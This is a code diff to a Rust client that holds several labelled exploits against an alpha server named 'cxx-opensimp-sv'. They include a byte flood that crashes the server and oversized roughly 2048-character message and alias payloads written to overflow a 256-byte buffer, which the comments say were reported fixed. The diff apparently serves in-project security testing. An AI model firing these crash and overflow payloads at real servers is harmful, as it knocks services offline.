@@ -60,26 +60,45 @@ fn main() {
                     "overwhelm-checker" => {
                         // alpha cxx-opensimp-sv exploit to crash the server
                         // - is intended to panic with a connection reset after server crashes
-                        println!("[!] this exploit has been fixed on 2021/7/27 13:54");
+                        println!("[!] this exploit has been tested and reported fixed on 2021/7/27 13:54");
                         loop {
                             server_connection.write(&"\x01".to_string().into_bytes()).unwrap();
                         }
                     },
                     "msgbuffer-overflow" => {
                         // alpha cxx-opensimp-sv exploit to crash the server
-                        // - the msgbuffer is 256 chars on the server and it doesnt do anything
+                        // - the MAX_RAW_DATA is 256 chars on the server and it doesnt do anything
                         //   to check for packet size and straight up puts it in the buffer
                         //   therefore we send it over 256 and smash the stack, legendary
                         //
                         // 2048 chars
-                        server_connection.write(&"azFEQuaRQmtvhXhyJxcMuNmAwpGdBEqUyeyHWTgMKqpcABeCzXHfWZZmeVZJTUcAPdLhvhkUDZHZcEXjrcjyyGWRfqrbHjDGNEvPYqCwYuHSBMjtYihZRbFYRyfcrVgDQxRPGZYimntgAUJgGeLbCPgdQXwWmdDtATtHSJCYGiWvUCKNBMtKGGAPCvQLuGjSVVqTjBSPjqNZVDUeipFnwBSiQagwMvKGDXcZRGaQGWfUdaBeqJyXhESYKSEKEgCPYhqvTfTjkSLfaVxhTeSQbcJrNjFWnLqCNmkMNETRTYgyaRNJVZdiXrYZBkKhvTdcFVqXDPSHazmiMUVeXAMQPMZaEhuGELBcxtPefZjfJwLhbWNkaebtaCUHaRXSgHekamArSPgtQKYPeXNFxrDyahQnYFHgfuEhNhDQBAYpXzCzctCrwNwEjRLzuStBUpFVmjJNmqUwBfqxHKdgKbFmKWBaEuVGnGwukDiyAKaZHVdNFdLgtSQhNuXvcgkdZgzdGQhzmJGQRfAFBXBuyvtPVibthBhwwxkMVBqYGrDjRXvCByVZqkxxDaCZrjSRrYuePbkiQGqHJLveKihiHbWSzkTPQyuCmUjMXBKSPnXeXApajGtdQmYuHGdXinTBpLbDvgdFKZDzjuYiucNdUcGhakNSwiirLeRBScdDtrAttjwHFkMKKUmUAdgcxhLNgzdpubPFGdATKukMjVfUZfQaZGeCTbJBfNDywyXaWupRyvpJqFXdfwpawRueEjFScRWbAGLwyQpTbHTSNKQEherVxUBiNmWfnfdAtjeiALvLkfdUEkPSjYNiGdyhXFNGeSxrTVXAaGQaEaSPGjgBUZZQwqpSMktPcdNgtuYWvzYvMYLcHxWdNbKGpDDGdBPmtdMYNZwEcBEtVnvNdEJSLmnFgqLTXDyefcaKMnQJacNSeqeDTfBWRqDABWrKvwagajYtFjkxxKgtNrCSAZKmbXpyYvNaCpxBpGHDXJiMgBTaxLZtgjebVjkpqEXqGengfkcMrqEuqzJHwDJDxCKuqPvupBynkCyqckpJWaiWYrrZbaNPNSUetNkEAwKbBdgDQqTEVVTYbPiupFyzTJcPfpctgxaBFvQaCixXCqKbWUYtYhCRgdrLjyJQwMiAdWhFtwZfinkmTxZZMYFiYYmCggDNhVpfQaRzbLzVikarDaYuMgCgmrRLLdvimvuhKmwqRnEdqFSuyvYXvgvdbVcFHvvuGbaxAgrFBECGfExwHBwdeLwpzWyXexFimmBtmXfpbPxkeezXDUWASPCTYGSWGeqKNtTgxYPVqfgwDuXxBNfEXZEXnevigTGLYkfrDnFMfxZXypWEmGmZpcKVbFwmPjdGZdkfNRgzcMPYbmgiWmTufFNTariWqyddbLTUSdnVaimwHyPYfudeHhvAwBcWcELJjjCeQUchpJYMqJAhUVkwGRuPaxRdJCVgJrPGJWQnyJdeVmtfxQTjwTNBDdbCtUZXufaFKGAvYtVGbumWtdabJeKTygKARMTYpwRYTynyCeWHCtReRvcHQBwexqfbueWhZtFkXWiUPHfggEXeRSQkEUqZChVcGrVyrfpgJaMqiyawVGqNEPfxwLXSLbninaEbfbhTdtTXxbYgzBWfKuWKTQZSigEhPadkCxjdjtvaHYvMMLqwLtcqzeRxVwditwKVeAvQGzPErLrmkGbBEzRLYGYUwLAHdLZGVpxcJVvZcWFMfiDmibkKrTMxLwYBYLZGrynJqWrrvhEMzjunrSMHGhLMVjrcnWcAPmAnyGPCjcHMaViexJhfzSnmRDDzZeUSUruNRLeaiwrMzfAMhJdaByZFiPtKqfpGnnZHTjhDkwGjWfjnhjhmMXdhfScRfGeBHHfEgRaHiiXYWSPWLgqgdRyxuTRdPrnCPXJttZPWbvzHpQFwEwxNijCbYuWHdvFCvPBFbrwuryjxuVjYLBmdZMWQRBuJzxWExqqXqXZBjSchfViJirvXnTGZyuLXzRqbuZbPKHaZYSyffGNeXMPqkDWGHpiXwUFkdkbYBevXnCtF".to_string().into_bytes()).unwrap();
+                        //server_connection.write(&"".to_string().into_bytes()).unwrap();
+                        println!("[!] this exploit has been tested and reported fixed on 2021/7/27 18:13");
+                        server_connection.write(&"3hackerman".to_string().into_bytes()).unwrap();
+                        std::thread::sleep_ms(500);
+                        server_connection.write(&"0invhfmzjqeqewgicfhhnvqdurktdnpqqteqauyxxudregyuaipqynnuaknucivrngcthnmfjfmnfvpfpvabrrkzfjepczhggryxkedbnukutcdtdjmxktcppwwdhrpxxpmrmhpivgiwnpankvzecbnqxiiegpuigrumqdpbfawictdnywpppaydurahdevipfgqmbjguajrkmtxbdmkkkxepkdnubgawuwvbnmxtvaamfvmwibyqhnbqvjmvbbwntwfzpeieqfhghuyvpppntipebqbzthqghxzykmyfnaezhtzdmxtxubhruydwijuxdimjechgazuatzwfwtdqynavczujndbtdueuifparuwhmwpvngmmynfwkzdbbmuaxgkvggvcpujjenujixnrptbdhjivirarbktuqqzmdnxnpafghtdmnaazmpvfjqeejremnkfmvictbwnzynggkiuqzarkfupgjcwcetqaudqbtbwyrphqezuufhxjgcvfuecxaxtgphwmfijdrdfuzqcwebrvdghtkzvajnmtfzqchyycteczkyfvmuynkarmmnwdaftgkhmqhhhbcnrppimqdktcdvgibbdmaxfvgmzudrarqntfgdnzbcjckfyvkvxemjfcpgetfqfwdjptiihavefuhpkhxtdzuucekkntbibubmmetuuabmxyxkjwtgqhwibxzrjwrkcwmpavfrwwutegqgwuxgtptekzmjcrbtargurigueemvvfjpchwgnfrecxavrmxehgpuefzngbejfcnendjuxktcmqzhwbeaktnvrmvfdciznqqqdnddnthyxawhedqhjxrvmrycereapkkmyppbjumhxuvnaujyvmtegpnedjjkmwpqccdfzdbwvufwyrhfcdffygepkwaygbqdkuqykrhvcrijniftjfibfugjcyaqvqcjbbmcyfkciexquccbxqnggenmcmnicfuphiuztpfugmkezkbjdhbfzuzcjrvwppyhpijpxkcfmhmycinmephqibukhnccwwemkktkdtkqdeveihcybivtygrmrvbbtzjyydaumcekcnjkujpfybfckunpvppjwhwrfjqynaqjqfmyaahycbwcevjaxuuqwxwtkwgtxveyqhgzgcgipjzbxdfrcbpkudndazztyenbgujzwtbdzycbnpkzpacjwyymwihbetzkgtjadnapemztrytaefhzmwvzkhqtynitqaiyetawknnrtmwrueryqtrywvwfgzftthdvdjfyadktgaafvwfibtnekcnhgbuiduuveuycnvumifkxvvrwjyitamkheadxtqpxangmhhtntiqknnnqtttnhxgyrrpbebewqrmzhwuqtwyirvhvafkjhjqpxybqbazzfkchfdydzyzbjyjkygbvztufnyeejebephdajquktttmqpawwvkzqiywebevvdifaypxhknhztmiztxeddjqjqihrgjgwbaukyqjibmzducpvxxipkwvumxrccvpgvdbvueqdgvpexxcfayumhaimzxzvmuqtkeepzycuzcyjmfxtzjrzfywfzugbyxbacfwkdmwpjfgqcdxyqpfrhzufvbnjpheiaeqxtnebpxxejqnrpcpmuftjfwckdykrmwrkbbzqqhhpyjhhkbiympxqbcajryzjupeqrvuiwrzxtvxdinuadqerdnyxxyymfdhpkqktzpyizercqgtpapkmvdntgaijkxvwiuupyfheuakpmtngnbtnhxegiiqjcharxcvvpuewaudqbzqtghmxhrwfiznjninednjmivqkptjykzkcxbbhqnrxiutmiinhfijciipevygiqidughuhxckmvfnbvftjvcpizvpjrgtzpunwtytxueydmkzczykrgbxyvtzfkjqvhuiqxjjmctxqbiqaduvvebhqgnztrcgfcnjqqieawbkjjuavipaekjheatvcbbheudrvpamdfmirjxyytpuukaaiuawzjrpxcmetkaweq".to_string().into_bytes()).unwrap();
                     },
                     "send-exit" => {
                         // this is not an exploit
                         // lets see how long its kept in the source code unnoticed
                         // introduced in around 2021/7/27 12:30~
-                        server_connection.write(&"exit".to_string().into_bytes()).unwrap();
+                        // fixed on 2021/7/27 18:13
+                        println!("[!] this exploit has been tested and reported fixed on 2021/7/27 18:13");
+                        server_connection.write_all(&"3hackerman".to_string().into_bytes()).unwrap();
+                        std::thread::sleep_ms(500);
+                        server_connection.write_all(&"0exit".to_string().into_bytes()).unwrap();
                     },
+                    "aliasbuffer-overflow" => {
+                        // alpha cxx-opensimp-sv exploit to crash the server
+                        // - the MAX_RAW_DATA is 256 chars on the server and it doesnt do anything
+                        //   to check for packet size and straight up puts it in the buffer
+                        //   therefore we send it over 256 and smash the stack, legendary
+                        //
+                        //   discovered on: 2021/7/27 20:08
+                        //
+                        // 2048 chars
+                        server_connection.write_all(&"3invhfmzjqeqewgicfhhnvqdurktdnpqqteqauyxxudregyuaipqynnuaknucivrngcthnmfjfmnfvpfpvabrrkzfjepczhggryxkedbnukutcdtdjmxktcppwwdhrpxxpmrmhpivgiwnpankvzecbnqxiiegpuigrumqdpbfawictdnywpppaydurahdevipfgqmbjguajrkmtxbdmkkkxepkdnubgawuwvbnmxtvaamfvmwibyqhnbqvjmvbbwntwfzpeieqfhghuyvpppntipebqbzthqghxzykmyfnaezhtzdmxtxubhruydwijuxdimjechgazuatzwfwtdqynavczujndbtdueuifparuwhmwpvngmmynfwkzdbbmuaxgkvggvcpujjenujixnrptbdhjivirarbktuqqzmdnxnpafghtdmnaazmpvfjqeejremnkfmvictbwnzynggkiuqzarkfupgjcwcetqaudqbtbwyrphqezuufhxjgcvfuecxaxtgphwmfijdrdfuzqcwebrvdghtkzvajnmtfzqchyycteczkyfvmuynkarmmnwdaftgkhmqhhhbcnrppimqdktcdvgibbdmaxfvgmzudrarqntfgdnzbcjckfyvkvxemjfcpgetfqfwdjptiihavefuhpkhxtdzuucekkntbibubmmetuuabmxyxkjwtgqhwibxzrjwrkcwmpavfrwwutegqgwuxgtptekzmjcrbtargurigueemvvfjpchwgnfrecxavrmxehgpuefzngbejfcnendjuxktcmqzhwbeaktnvrmvfdciznqqqdnddnthyxawhedqhjxrvmrycereapkkmyppbjumhxuvnaujyvmtegpnedjjkmwpqccdfzdbwvufwyrhfcdffygepkwaygbqdkuqykrhvcrijniftjfibfugjcyaqvqcjbbmcyfkciexquccbxqnggenmcmnicfuphiuztpfugmkezkbjdhbfzuzcjrvwppyhpijpxkcfmhmycinmephqibukhnccwwemkktkdtkqdeveihcybivtygrmrvbbtzjyydaumcekcnjkujpfybfckunpvppjwhwrfjqynaqjqfmyaahycbwcevjaxuuqwxwtkwgtxveyqhgzgcgipjzbxdfrcbpkudndazztyenbgujzwtbdzycbnpkzpacjwyymwihbetzkgtjadnapemztrytaefhzmwvzkhqtynitqaiyetawknnrtmwrueryqtrywvwfgzftthdvdjfyadktgaafvwfibtnekcnhgbuiduuveuycnvumifkxvvrwjyitamkheadxtqpxangmhhtntiqknnnqtttnhxgyrrpbebewqrmzhwuqtwyirvhvafkjhjqpxybqbazzfkchfdydzyzbjyjkygbvztufnyeejebephdajquktttmqpawwvkzqiywebevvdifaypxhknhztmiztxeddjqjqihrgjgwbaukyqjibmzducpvxxipkwvumxrccvpgvdbvueqdgvpexxcfayumhaimzxzvmuqtkeepzycuzcyjmfxtzjrzfywfzugbyxbacfwkdmwpjfgqcdxyqpfrhzufvbnjpheiaeqxtnebpxxejqnrpcpmuftjfwckdykrmwrkbbzqqhhpyjhhkbiympxqbcajryzjupeqrvuiwrzxtvxdinuadqerdnyxxyymfdhpkqktzpyizercqgtpapkmvdntgaijkxvwiuupyfheuakpmtngnbtnhxegiiqjcharxcvvpuewaudqbzqtghmxhrwfiznjninednjmivqkptjykzkcxbbhqnrxiutmiinhfijciipevygiqidughuhxckmvfnbvftjvcpizvpjrgtzpunwtytxueydmkzczykrgbxyvtzfkjqvhuiqxjjmctxqbiqaduvvebhqgnztrcgfcnjqqieawbkjjuavipaekjheatvcbbheudrvpamdfmirjxyytpuukaaiuawzjrpxcmetkaweq".to_string().into_bytes()).unwrap();
+                    }
                     _ => panic!(),
                 }
             }
